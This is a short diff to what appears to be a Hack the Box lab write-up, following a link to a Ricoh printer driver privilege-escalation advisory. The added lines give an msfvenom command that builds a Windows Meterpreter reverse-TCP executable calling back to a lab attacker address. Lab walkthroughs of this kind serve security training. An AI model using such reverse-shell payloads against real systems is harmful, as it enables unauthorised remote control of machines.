@@ -200,3 +200,8 @@ Search Exploits
 Read - [Local Privilege Escalation](https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/dee82084-c5d5-4c78-b13f-8c7b107e34db)
 
+Obtain Meterpreter Session
+- Create an executable payload which will return a shell back to our attacker machine.
+```CSS
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f exe > shell.exe
+```
